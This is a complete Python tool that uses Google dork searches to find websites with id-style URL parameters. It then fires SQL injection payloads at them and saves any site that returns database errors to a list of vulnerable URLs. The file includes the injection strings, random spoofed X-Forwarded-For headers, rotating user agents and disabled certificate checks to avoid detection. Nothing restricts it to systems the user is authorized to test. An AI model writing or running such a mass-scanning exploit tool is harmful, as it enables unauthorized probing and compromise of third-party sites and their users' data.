import os
import random
import re
import time
import ssl
import logging
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import csv
from typing import List, Set, Dict, Optional
from urllib3.util.ssl_ import create_urllib3_context
import warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.filterwarnings("ignore", category=InsecureRequestWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Configuration
DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
DEFAULT_USER_AGENT_FILE = 'user_agents.txt'
DEFAULT_PAYLOADS_FILE = 'payloads.txt'
DEFAULT_REPORT_FILE = 'report.csv'
DEFAULT_LOG_FILE = 'scanner.log'
MAX_VULNERABLE_URLS = 10
MAX_API_PAGES = 10
REQUEST_TIMEOUT = (15, 25)
DELAY_BETWEEN_REQUESTS = (1, 3)

# SQL Error Patterns
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"Unclosed quotation mark",
    r"Syntax error.*sql",
    r"ORA-\d{5}",
    r"PostgreSQL.*ERROR",
    r"Microsoft SQL Server.*Error",
    r"DB2 SQL error"
]

# Configure logging to file only
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(DEFAULT_LOG_FILE)]
)
logger = logging.getLogger(__name__)
logger.propagate = False

class CustomSSLAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = create_urllib3_context()
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

class SqlScan:
    def __init__(self, api_key: str, cse_id: str):
        self.api_key = api_key
        self.cse_id = cse_id
        self.scanned_urls = set()
        self.user_agents = []
        self.payloads = []
        self.session = self._configure_session()
        self.initialize_components()

    def _configure_session(self):
        session = requests.Session()
        session.mount('https://', CustomSSLAdapter())
        retry_strategy = requests.adapters.Retry(
            total=2,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retry_strategy))
        return session

    def initialize_components(self):
        self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
        self.user_agents = self.load_file(DEFAULT_USER_AGENT_FILE) or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.payloads = self.load_file(DEFAULT_PAYLOADS_FILE) or [
            "'", 
            "' OR '1'='1",
            "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--"
        ]

    def load_file(self, file_path: str) -> List[str]:
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def load_scanned_urls(self, scanned_urls_file: str) -> Set[str]:
        if os.path.exists(scanned_urls_file):
            with open(scanned_urls_file, 'r') as f:
                return {line.strip() for line in f}
        return set()

    def save_scanned_url(self, url: str):
        with open(DEFAULT_SCANNED_URLS_FILE, 'a') as f:
            f.write(url + '\n')

    def get_random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

    def dorking(self, dork: str, page: int) -> List[str]:
        search_url = "https://www.googleapis.com/customsearch/v1"
        urls = []
        
        params = {
            'q': dork,
            'key': self.api_key,
            'cx': self.cse_id,
            'start': (page-1)*10 + 1,
            'num': 10
        }
        
        try:
            response = self.session.get(search_url, params=params, timeout=REQUEST_TIMEOUT)
            response.raise_for_status()
            urls.extend(item['link'] for item in response.json().get('items', []))
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
        except Exception:
            pass
            
        return urls

    def is_valid_url(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            sql_params = ['id', 'item', 'product', 'user', 'uid', 'pid', 'page']
            return any(p in query for p in sql_params)
        except Exception:
            return False

    def _make_request(self, url: str) -> Optional[str]:
        try:
            response = self.session.get(
                url,
                headers=self.get_random_headers(),
                timeout=REQUEST_TIMEOUT,
                allow_redirects=False,
                verify=False
            )
            return response.text
        except Exception:
            return None

    def check_vulnerability(self, url: str) -> Optional[bool]:
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            if not query:
                return None
                
            param = list(query.keys())[0]
            test_url = f"{url}&{param}=xyz123"
            
            original = self._make_request(url)
            altered = self._make_request(test_url)
            if not original or not altered or original == altered:
                return False
                
            for payload in self.payloads:
                test_url = self._build_test_url(parsed, param, list(query.values())[0][0], payload)
                response = self._make_request(test_url)
                if response and any(re.search(pattern, response.lower()) for pattern in SQL_ERROR_PATTERNS):
                    return True
                    
            return False
        except Exception:
            return None

    def _build_test_url(self, parsed, param, value, payload):
        query = parse_qs(parsed.query)
        query[param] = [value + payload]
        return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))

    def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
        vulnerable_urls = []
        
        print(f"\n{'='*50}")
        print(f"Scanning: {dork}")
        print(f"{'='*50}\n")

        for page in range(1, MAX_API_PAGES + 1):
            print(f"[*] Processing page {page}...", end='\r')
            
            urls = [url for url in self.dorking(dork, page) 
                   if url not in self.scanned_urls and self.is_valid_url(url)]
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                results = list(executor.map(self.check_vulnerability, urls))
            
            for url, result in zip(urls, results):
                if result is True:
                    vulnerable_urls.append(url)
                    print(f"\n[+] VULNERABLE: {url}")
                elif result is None:
                    print(f"\n[-] SKIPPED: {url}")
                self.save_scanned_url(url)
                
                if len(vulnerable_urls) >= max_vulnerable:
                    break
            
            if len(vulnerable_urls) >= max_vulnerable or not urls:
                break
                
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))

        print(f"\n{'='*50}")
        print(f"Found {len(vulnerable_urls)} vulnerable URLs")
        print(f"{'='*50}\n")
        return vulnerable_urls

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_api_credentials():
    clear_console()
    print("="*50)
    print("SQL Injection Scanner".center(50))
    print("="*50)
    api_key = input("\nGoogle Custom Search API key: ").strip()
    cse_id = input("Custom Search Engine ID: ").strip()
    return api_key, cse_id

def get_dork_and_options():
    dork = input('\nDork (e.g. "inurl:product?id="): ').strip()
    max_vuln = input('Max vulnerable URLs to find (default 10): ').strip()
    max_vuln = int(max_vuln) if max_vuln.isdigit() else 10
    save_report = input("Save results to file? (y/n): ").lower() == 'y'
    return dork, max_vuln, save_report

def write_report(vulnerable_urls: List[str]):
    with open(DEFAULT_REPORT_FILE, 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["Vulnerable URLs"])
        writer.writerows([[url] for url in vulnerable_urls])

def main():
    try:
        api_key, cse_id = get_api_credentials()
        scanner = SqlScan(api_key, cse_id)
        
        while True:
            dork, max_vuln, save_report = get_dork_and_options()
            clear_console()
            
            vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
            
            if vulnerable_urls:
                print("\nVulnerable URLs:")
                for i, url in enumerate(vulnerable_urls, 1):
                    print(f"{i}. {url}")
                
                if save_report:
                    write_report(vulnerable_urls)
                    print(f"\n[*] Report saved to {DEFAULT_REPORT_FILE}")
            else:
                print("\nNo vulnerable URLs found")
                
            if input("\nScan again? (y/n): ").lower() != 'y':
                print("\nGoodbye!")
                break
                
    except KeyboardInterrupt:
        print("\nScan stopped")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
